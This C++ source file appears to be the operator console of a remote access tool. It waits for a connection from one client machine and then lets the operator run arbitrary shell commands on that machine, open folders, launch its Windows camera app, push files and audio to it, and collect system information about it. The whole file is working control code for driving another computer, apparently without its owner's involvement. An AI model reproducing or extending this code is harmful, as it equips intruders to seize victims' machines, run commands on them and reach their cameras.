#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <limits>
#include "../Headers/menu.h"
#include <unistd.h>
#include "../Headers/CaesarCipherShift.h"
#include "Send-File/sendFile.h"

int main() {
    sockaddr_in serverAddress{}, clientAddress{};
    socklen_t clientLength = sizeof(clientAddress);
    int serverFileDescripter; // 0 = standard input, 1= standard output, 2= standard error, 3 = socket created
    int clientFileDescriptor;
    char buffer[BUFFERSIZE];

    serverFileDescripter = socket(AF_INET, SOCK_STREAM, 0);
    if(serverFileDescripter < 0) {
        std::cout << ERROR_PREFIX << " Socket failed to create\n";
        return 1;
    } else if(serverFileDescripter == 3) {
        std::cout << SUCCESS_PREFIX << " Socket created\n";
    }

    serverAddress.sin_family = AF_INET; // IPv4
    serverAddress.sin_addr.s_addr = INADDR_ANY; // ip address to bind to
    serverAddress.sin_port = htons(PORT); // htons converts port to network byte order
    if(bind(serverFileDescripter, (sockaddr*) &serverAddress, sizeof(serverAddress)) < 0) {
        std::cout << ERROR_PREFIX << " Bind failed to create\n";
        perror(ERROR_PREFIX);
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Bind created\n";
    }

    if(listen(serverFileDescripter, 1) < 0) {
        std::cout << ERROR_PREFIX << " Failed to find incoming connection requests\n";
        return 1;
    } else {
        std::cout << PENDING_PREFIX << " Listening on port: " << PORT << std::endl; 
    }

    clientFileDescriptor = accept(serverFileDescripter, (sockaddr*) &clientAddress, &clientLength);
    if(clientFileDescriptor < 0) {
        std::cout << ERROR_PREFIX << " Connection failed\n";
    } else {
        std::cout << SUCCESS_PREFIX << " Connection established\n";
    }

    int bytesRec, bytesSend;
    while(true) {
        int choice = menu();

        if(choice == TYPE_TEXT) {
            std::cout << CONSOLE_PREFIX << " Type /back to return to the menu.\n";

            while(true) {
                std::string cmd;
                std::cout << CONSOLE_PREFIX << " Type here: ";
                std::getline(std::cin, cmd);

                if(cmd == "/back") {
                    int back = TYPE_BACK;
                    bytesSend = send(clientFileDescriptor, &back, sizeof(back), 0);
                    break;
                } else if (cmd.empty()) {
                    continue;
                }

                int msg = TYPE_TEXT;
                bytesSend = send(clientFileDescriptor, &msg, sizeof(msg), 0);
                bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);

                bytesRec = recv(clientFileDescriptor, buffer, BUFFERSIZE, 0);
                std::string clientRec(buffer, bytesRec);

                std::cout << clientRec << std::endl;
            }
        }

        if(choice == TYPE_FILE) {           
            std::string path;
            std::cout << CONSOLE_PREFIX << " Enter path: ";
            std::getline(std::cin, path);
            std::cout << std::endl;

            int type = TYPE_FILE;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
            sendFile(clientFileDescriptor, path);
        }

        if(choice == TYPE_INFO) {
            int type = TYPE_INFO;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);

            std::cout << PENDING_PREFIX << " Requesting client information..\n";

            char infoBuffer[BUFFERSIZE];
            bytesRec = recv(clientFileDescriptor, infoBuffer, sizeof(infoBuffer), 0);

            if(bytesRec > 0) {
                std::cout << SUCCESS_PREFIX << " Received client information\n\n";
                char clientsIP[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &clientAddress.sin_addr, clientsIP, INET_ADDRSTRLEN);
                std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| CLIENT INFORMATION |!|!|!|!|!|!|\n";
                std::cout << SUCCESS_PREFIX << " Client IP: " << clientsIP <<  std::endl;
                std::cout << infoBuffer;
                std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| ------------------ |!|!|!|!|!|!|\n";
            } else {
                std::cout << ERROR_PREFIX << " Failed to receive client information\n";
            }
        }

        if(choice == TYPE_EXECUTE) {
            while(true) {
                std::cout << CONSOLE_PREFIX << " 1 - Open a folder\n";
                std::cout << CONSOLE_PREFIX << " 2 - Execute a command\n";
                std::cout << CONSOLE_PREFIX << " 3 - Open camera\n\n";

                int choice;
                std::cout << CONSOLE_PREFIX << " Choose an option: ";
                std::cin >> choice;
                if(std::cin.fail()) {
                    std::cin.clear();
                    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                    std::cout << ERROR_PREFIX << " Invalid usage, please enter a number between 1-3\n";
                    continue;
                } else if (!(choice >= 1 && choice <= 3)) {
                    std::cout << ERROR_PREFIX << " Invalid usage, please enter a number between 1-3\n";
                    continue;
                }

                switch(choice) {
                    case 1: {
                        std::cout << CONSOLE_PREFIX << " Enter the path: ";
                        std::string path;
                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                        std::getline(std::cin, path);

                        int type = TYPE_EXECUTE;
                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);

                        int subtype = 1;
                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);

                        bytesSend = send(clientFileDescriptor, path.c_str(), path.length(), 0);

                        std::cout << SUCCESS_PREFIX << " Sent folder cmd.\n";

                        char msgBuf[BUFFERSIZE];
                        bytesRec = recv(clientFileDescriptor, msgBuf, sizeof(msgBuf), 0);

                        std::cout << SUCCESS_PREFIX << " " << msgBuf << std::endl;
                        break;
                    }

                    case 2: {
                        std::cout << CONSOLE_PREFIX << " Enter command: ";
                        std::string cmd;
                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                        std::getline(std::cin, cmd);

                        int type = TYPE_EXECUTE;
                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);

                        int subtype = 2;
                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);

                        std::cout << PENDING_PREFIX << " Executing command '" << cmd << "'\n";
                        bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);

                        std::cout << SUCCESS_PREFIX << " Command: '" << cmd << "' executed\n";
                        break;
                    }

                    case 3: {
                        std::string cmd = "explorer.exe \"shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App\"";

                        int type = TYPE_EXECUTE;
                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);

                        int subtype = 3;
                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);

                        bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
                        std::cout << SUCCESS_PREFIX << " Sent camera execution cmd\n";
                        break;
                    }
                }

                break;
            }
        }

        if(choice == TYPE_SOUND) {
            std::string path;
            std::cout << CONSOLE_PREFIX << " Enter audio path: ";
            std::getline(std::cin, path);
            std::cout << std::endl;

            int type;
            type = TYPE_SOUND;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
            sendFile(clientFileDescriptor, path);
        }

        if(choice == TYPE_EXIT) {
            int type = TYPE_EXIT;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
            break;
        }
    }

    return 0;
}
